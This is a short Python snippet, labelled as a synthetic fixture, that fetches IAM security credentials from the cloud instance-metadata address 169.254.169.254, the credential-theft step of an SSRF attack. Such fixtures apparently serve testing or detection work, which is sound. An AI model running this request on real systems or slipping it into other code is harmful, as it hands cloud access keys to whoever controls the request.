# Synthetic fixture: cloud instance-metadata credential theft (SSRF to IMDS).
import urllib.request

url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
creds = urllib.request.urlopen(url).read()
